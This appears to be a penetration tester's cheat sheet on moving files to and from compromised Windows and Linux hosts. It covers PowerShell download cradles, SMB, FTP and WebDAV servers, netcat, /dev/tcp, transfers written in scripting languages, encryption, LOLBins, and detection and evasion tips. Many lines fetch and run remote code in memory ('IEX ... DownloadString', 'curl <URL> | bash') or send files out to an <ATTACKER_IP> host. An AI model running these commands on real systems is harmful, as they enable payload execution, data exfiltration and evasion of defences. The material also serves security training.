## Setting the Stage

Example engagement chaining a web shell, blocked PowerShell, SeImpersonatePrivilege and an SMB transfer to escalate privileges.

PowerUp.ps1: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1  
Application Control Policy: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control  
SeImpersonatePrivilege: https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege  
PrintSpoofer: https://github.com/itm4n/PrintSpoofer  
Certutil: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil  
Impacket smbserver: https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py

## Windows File Transfer Methods

Native Windows tools for download and upload operations.

### Download Operations

#### PowerShell Base64 Encode & Decode

```bash
md5sum <FILE>
cat <FILE> | base64 -w 0; echo
```

```powershell
[IO.File]::WriteAllBytes("<OUTPUT_FILE>", [Convert]::FromBase64String("<BASE64_STRING>"))
Get-FileHash <OUTPUT_FILE> -Algorithm md5
```

Gotcha: cmd.exe caps strings at 8,191 chars, large strings may also break a web shell.

#### PowerShell Web Downloads

Net.WebClient / Invoke-WebRequest over HTTP, HTTPS or FTP.

```powershell
(New-Object Net.WebClient).DownloadFile('<URL>','<OUTPUT_FILE>')
(New-Object Net.WebClient).DownloadFileAsync('<URL>','<OUTPUT_FILE>')
IEX (New-Object Net.WebClient).DownloadString('<URL>') # fileless, runs in memory
(New-Object Net.WebClient).DownloadString('<URL>') | IEX
Invoke-WebRequest <URL> -OutFile <OUTPUT_FILE> # aliases: iwr, curl, wget
Invoke-WebRequest <URL> -UseBasicParsing | IEX # fix IE first-launch error
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} # fix SSL/TLS trust error
```

Harmj0y's PowerShell download cradle list covers proxy-awareness and disk-touching tradeoffs for each method.

#### SMB Downloads

SMB protocol, TCP/445.

```bash
sudo impacket-smbserver <SHARE> -smb2support <DIR>
sudo impacket-smbserver <SHARE> -smb2support <DIR> -user <USERNAME> -password <PASSWORD>
```

```cmd
copy \\<ATTACKER_IP>\<SHARE>\<FILE>
net use n: \\<ATTACKER_IP>\<SHARE> /user:<USERNAME> <PASSWORD>
copy n:\<FILE>
```

Gotcha: newer Windows blocks unauthenticated guest SMB, use an authenticated share or mount with `net use`.

#### FTP Downloads

FTP: control TCP/21, data TCP/20.

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21 # anonymous auth by default
```

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://<ATTACKER_IP>/<FILE>', '<OUTPUT_FILE>')
```

```cmd
echo open <ATTACKER_IP> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET <FILE> >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

Use a command file when there's no interactive shell.

### Upload Operations

#### PowerShell Base64 Encode & Decode

```powershell
[Convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
Get-FileHash "<FILE>" -Algorithm MD5 | select Hash
```

```bash
echo <BASE64_STRING> | base64 -d > <OUTPUT_FILE>
md5sum <OUTPUT_FILE>
```

#### PowerShell Web Uploads

PowerShell has no built-in upload function, build one with Invoke-WebRequest/Invoke-RestMethod against a server that accepts uploads.

```bash
pip3 install uploadserver
python3 -m uploadserver # file upload at /upload
```

```powershell
IEX(New-Object Net.WebClient).DownloadString('<PSUpload.ps1 URL>')
Invoke-FileUpload -Uri http://<ATTACKER_IP>:8000/upload -File <FILE>
```

PSUpload.ps1: https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1

Base64 variant with Netcat as the catcher:

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path '<FILE>' -Encoding Byte))
Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/ -Method POST -Body $b64
```

```bash
nc -lvnp 8000
echo <BASE64> | base64 -d -w 0 > <OUTPUT_FILE>
```

#### SMB Uploads

WebDAV (RFC 4918) extends HTTP so SMB falls back to it when TCP/445 is blocked outbound; also works over HTTPS.

```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=<DIR> --auth=anonymous
```

```cmd
dir \\<ATTACKER_IP>\DavWWWRoot
copy <FILE> \\<ATTACKER_IP>\DavWWWRoot\
copy <FILE> \\<ATTACKER_IP>\<SHARE>\
```

Gotcha: DavWWWRoot is a Mini-Redirector keyword, not a real folder, point at an existing share to skip it.  
Note: with no SMB (445) restriction, use impacket-smbserver as in the download section.

#### FTP Uploads

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
(New-Object Net.WebClient).UploadFile('ftp://<ATTACKER_IP>/<OUTPUT_FILE>', '<FILE>')
```

```cmd
echo open <ATTACKER_IP> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT <FILE> >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

## Linux File Transfer Methods

Native Linux tools and protocols for file transfer: HTTP, Bash, SSH, etc.

### Download Operations

#### Base64 Encoding / Decoding

```bash
md5sum <FILE>
cat <FILE> | base64 -w 0; echo
echo -n '<BASE64_STRING>' | base64 -d > <OUTPUT_FILE>
md5sum <OUTPUT_FILE>
```

Note: reverse this (cat + base64 on target, decode on Pwnbox) to upload instead.

#### Web Downloads with Wget and cURL

```bash
wget <URL> -O <OUTPUT_FILE>
curl -o <OUTPUT_FILE> <URL>
```

#### Fileless Attacks Using Linux

```bash
curl <URL> | bash
wget -qO- <URL> | python3
```

LinEnum.sh: https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh  
helloworld.py: https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py

Gotcha: payloads like mkfifo still write temp files to disk even though execution is fileless.

#### Download with Bash (/dev/tcp)

Condition: Bash ≥2.04 compiled with --enable-net-redirections, no other transfer tool available.

```bash
exec 3<>/dev/tcp/<TARGET_IP>/<PORT>
echo -e "GET /<FILE> HTTP/1.1\n\n">&3
cat <&3
```

#### SSH Downloads

SCP: secure file copy over the SSH protocol.

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
netstat -lnpt
```

```bash
scp <USERNAME>@<ATTACKER_IP>:<FILE> .
```

Use a temp user account instead of primary creds/keys for transfers.

### Upload Operations

#### Web Upload

```bash
sudo python3 -m pip install --user uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
sudo python3 -m uploadserver 443 --server-certificate server.pem
```

```bash
curl -X POST https://<ATTACKER_IP>/upload -F 'files=@<FILE>' -F 'files=@<FILE_2>' --insecure
```

#### Alternative Web File Transfer Method

```bash
python3 -m http.server
python2.7 -m SimpleHTTPServer
php -S 0.0.0.0:<PORT>
ruby -run -ehttpd . -p<PORT>
```

```bash
wget <ATTACKER_IP>:<PORT>/<FILE>
```

Gotcha: inbound traffic to the new web server may be blocked; this downloads from target to attack host, it is not an upload.

#### SCP Upload

Condition: outbound SSH (TCP/22) allowed.

```bash
scp <FILE> <USERNAME>@<TARGET_IP>:<REMOTE_PATH>
```

## Transferring Files with Code

Use scripting languages on target to download, upload or execute files when native tools are unavailable.

### Python

```bash
python2.7 -c 'import urllib;urllib.urlretrieve ("<URL>", "<OUTPUT_FILE>")'
python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>", "<OUTPUT_FILE>")'
```

### PHP

```bash
php -r '$file = file_get_contents("<URL>"); file_put_contents("<OUTPUT_FILE>",$file);'
php -r 'const BUFFER = 1024; $fremote = fopen("<URL>", "rb"); $flocal = fopen("<OUTPUT_FILE>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
php -r '$lines = @file("<URL>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

Note: URL can be used as a filename with `@file` only if fopen wrappers are enabled.

### Other Languages

```bash
ruby -e 'require "net/http"; File.write("<OUTPUT_FILE>", Net::HTTP.get(URI.parse("<URL>")))'
perl -e 'use LWP::Simple; getstore("<URL>", "<OUTPUT_FILE>");'
```

### JavaScript

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

```cmd
cscript.exe /nologo wget.js <URL> <OUTPUT_FILE>
```

### VBScript

Installed by default on every Windows desktop release since Windows 98.

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

```cmd
cscript.exe /nologo wget.vbs <URL> <OUTPUT_FILE>
```

### Upload Operations using Python3

```bash
python3 -m uploadserver
```

```bash
python3 -c 'import requests;requests.post("<URL>",files={"files":open("<FILE>","rb")})'
```

## Miscellaneous File Transfer Methods

Alternative transfer methods: Netcat/Ncat, PowerShell Remoting (WinRM) sessions, and RDP.

### Netcat

Reads/writes TCP or UDP connections. Ncat adds SSL, IPv6, SOCKS/HTTP proxy support.

Listen on target, send from attack host:

```bash
nc -l -p <PORT> > <OUTPUT_FILE>
ncat -l -p <PORT> --recv-only > <OUTPUT_FILE> # closes conn when done
```

```bash
nc -q 0 <TARGET_IP> <PORT> < <FILE> # -q 0 closes conn after send
ncat --send-only <TARGET_IP> <PORT> < <FILE>
```

Listen on attack host instead (useful if inbound blocked on target), target connects:

```bash
sudo nc -l -p <PORT> -q 0 < <FILE>
sudo ncat -l -p <PORT> --send-only < <FILE>
```

```bash
nc <ATTACKER_IP> <PORT> > <OUTPUT_FILE>
ncat <ATTACKER_IP> <PORT> --recv-only > <OUTPUT_FILE>
```

No netcat/ncat on target:

```bash
cat < /dev/tcp/<ATTACKER_IP>/<PORT> > <OUTPUT_FILE>
```

### PowerShell Session File Transfer

WinRM: HTTP TCP/5985, HTTPS TCP/5986. Needs admin rights, Remote Management Users membership, or explicit PS Remoting permission.

```powershell
Test-NetConnection -ComputerName <TARGET> -Port 5985
$Session = New-PSSession -ComputerName <TARGET>
Copy-Item -Path <FILE> -ToSession $Session -Destination <REMOTE_PATH>
Copy-Item -Path <REMOTE_FILE> -Destination <LOCAL_PATH> -FromSession $Session
```

### RDP

Copy/paste into the RDP session, or mount a local resource as a drive.

```bash
rdesktop <TARGET_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' -r disk:linux='<LOCAL_DIR>'
xfreerdp /v:<TARGET_IP> /d:<DOMAIN> /u:<USERNAME> /p:'<PASSWORD>' /drive:linux,<LOCAL_DIR>
```

Access the mounted drive via `\\tsclient\` inside the session.  
Gotcha: the drive isn't accessible to other users on target, even if they hijack the RDP session.

## Protected File Transfers

Encrypt sensitive data before transfer when SSH/SFTP/HTTPS are unavailable, to avoid plaintext interception.

Note: don't exfiltrate real PII/financial data during testing, use dummy data to test DLP/egress controls instead.

### File Encryption on Windows

Invoke-AESEncryption.ps1: lightweight PowerShell AES-256-CBC encryption for files or strings.

```powershell

.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text" 

Description
-----------
Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
 
Description
-----------
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
 
Description
-----------
Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes
 
Description
-----------
Decrypts the file "file.bin.aes" and outputs the decrypted file "file.bin"
#>
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
```

```powershell
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "<PASSWORD>" -Path <FILE> # outputs <FILE>.aes
```

Use a strong, unique password per engagement, reuse risks mass decryption if one password leaks.

### File Encryption on Linux

openssl AES-256 file encryption with PBKDF2 key derivation.

```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in <FILE> -out <OUTPUT_FILE>.enc
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in <FILE>.enc -out <OUTPUT_FILE>
```

## Catching Files over HTTP/S

Stand up a secure Nginx server to receive file uploads over HTTP/HTTPS via PUT.

### Nginx - Enabling PUT

Gotcha: Apache + PHP will happily execute an uploaded webshell, Nginx is safer and simpler to configure for this.

```bash
sudo mkdir -p /var/www/uploads/<UPLOAD_DIR>
sudo chown -R www-data:www-data /var/www/uploads/<UPLOAD_DIR>
```

`/etc/nginx/sites-available/upload.conf`:

```nginx
server {
    listen <PORT>;

    location /<UPLOAD_DIR>/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

```bash
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo rm /etc/nginx/sites-enabled/default # free port 80 if already bound
sudo systemctl restart nginx.service
```

```bash
curl -T <FILE> http://localhost:<PORT>/<UPLOAD_DIR>/<OUTPUT_FILE>
```

Gotcha: an exposed directory with no index file lists all uploaded files; Nginx disables listing by default, Apache does not.

## Living off The Land

LOLBins/GTFOBins: legitimate OS binaries abused for download, upload, execution, file read/write and bypasses, useful against application whitelisting.

LOLBAS: https://lolbas-project.github.io/  
GTFOBins: https://gtfobins.github.io/

### Using the LOLBAS and GTFOBins Project

`LOLBAS search` `/download` `/upload` | `GTFOBins search` `+file download` `+file upload`

#### LOLBAS

```cmd
certreq.exe -Post -config http://<ATTACKER_IP>:<PORT>/ <FILE>
```

Catch with a Netcat listener on the attack host. Gotcha: some certreq.exe builds lack `-Post`, needs an updated version.

#### GTFOBins

```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept <PORT> -cert certificate.pem -key key.pem < <FILE>
```

```bash
openssl s_client -connect <TARGET_IP>:<PORT> -quiet > <OUTPUT_FILE>
```

### Other Common Living off the Land tools

#### Bitsadmin

BITS intelligently throttles to minimize impact on foreground user activity.

```cmd
bitsadmin /transfer <JOB_NAME> /priority foreground <URL> <OUTPUT_FILE>
```

```powershell
Import-Module bitstransfer; Start-BitsTransfer -Source "<URL>" -Destination "<OUTPUT_FILE>"
```

#### Certutil

```cmd
certutil.exe -verifyctl -split -f <URL>
```

Gotcha: AMSI currently flags this as malicious Certutil usage.

## Detection

User-Agent strings fingerprint HTTP clients and can reveal file transfer tools used by an attacker.

Command-line blacklisting is easy to bypass even with case obfuscation; whitelisting command lines is slower to set up but more robust.

#### User Agent Strings by Tool

```powershell
$h=new-object -com WinHttp.WinHttpRequest.5.1; $h.open('GET','<URL>',$false); $h.send(); iex $h.ResponseText
$h=New-Object -ComObject Msxml2.XMLHTTP; $h.open('GET','<URL>',$false); $h.send(); iex $h.responseText
```

`Invoke-WebRequest`/`Invoke-RestMethod` UA `WindowsPowerShell/5.1.14393.0` | `WinHttpRequest` UA `WinHttp.WinHttpRequest.5` | `Msxml2` UA `MSIE 7.0; Trident/7.0` | `certutil -urlcache`/`-verifyctl` UA `Microsoft-CryptoAPI/10.0` | `BITS` UA `Microsoft BITS/7.8`

## Evading Detection

Change User-Agent or use LOLBins to blend in with legitimate traffic and dodge application whitelisting/blacklisting.

### Changing User Agent

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest <URL> -UserAgent $UserAgent -OutFile <OUTPUT_FILE>
```

`[PSUserAgent]::` properties: `InternetExplorer` `FireFox` `Chrome` `Opera` `Safari`

### LOLBAS / GTFOBins

Application whitelisting may block PowerShell/Netcat, a LOLBin ("misplaced trust binary") may be permitted and unalerted.

```powershell
GfxDownloadWrapper.exe "<URL>" "<OUTPUT_FILE>"
```

LOLBAS: https://lolbas-project.github.io/  
GTFOBins: https://gtfobins.github.io/